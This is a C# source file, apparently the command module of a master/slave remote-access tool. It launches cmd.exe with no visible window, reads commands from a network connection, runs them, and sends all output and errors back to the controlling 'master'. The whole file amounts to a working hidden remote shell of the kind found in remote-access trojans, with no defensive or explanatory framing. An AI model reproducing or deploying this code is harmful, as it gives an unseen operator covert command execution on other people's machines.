using Shared;
using Slave.Commands.Core;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace Slave.Commands
{
    internal class Cmd : ICommand
    {
        public string name { get; } = "cmd";

        public void Process(List<string> args)
        {
            var processCmd = new Process
            {
                StartInfo =
                {
                    FileName = "cmd.exe",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    StandardOutputEncoding = Encoding.GetEncoding(850),
                    StandardErrorEncoding = Encoding.GetEncoding(850),
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,
                    RedirectStandardError = true
                },
            };
            processCmd.OutputDataReceived += CmdOutputDataHandler;
            processCmd.ErrorDataReceived += CmdErrorDataHandler;
            processCmd.Start();
            processCmd.BeginOutputReadLine();
            processCmd.BeginErrorReadLine();

            // Send input to display the cmd prompt path
            processCmd.StandardInput.WriteLine("echo %cd%>\n");

            while (true)
            {
                var userInput = SlaveCommandsManager.networkManager.ReadLine();

                if (userInput == "exit")
                {
                    processCmd.Kill();
                    break;
                }

                if (userInput == "")
                {
                    // If nothing is wrote, there will be a problem with the output processing (2 times just the path), this is a workaround
                    userInput = "echo %cd%>";
                }

                // Read next line from network stream reader and send it to the cmd
                processCmd.StandardInput.WriteLine($"{userInput}\n");
            }
        }

        /// <summary>
        /// Send output to master
        /// </summary>
        /// <param name="sendingProcess"></param>
        /// <param name="e"></param>
        void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs e)
        {
            var output = e.Data;
            if (string.IsNullOrEmpty(e.Data)) return;

            try
            {
                // Check if the line is the one representing the path
                if (output.Substring(1, 2) == ":\\" && output.Contains(">"))
                {
                    // Represents path + > + command
                    if (output[output.Length - 1] != '>')
                    {
                        return;
                    }

                    // Change current working directory to the path and return
                    Directory.SetCurrentDirectory(output.Substring(0, output.Length - 1));
                }

                SlaveCommandsManager.networkManager.WriteLine(output);
            }
            catch (Exception)
            {
                // ignored
            }
        }

        /// <summary>
        /// Send error output to master
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        void CmdErrorDataHandler(object sender, DataReceivedEventArgs e)
        {
            SlaveCommandsManager.networkManager.WriteLine(e.Data);
        }
    }
}
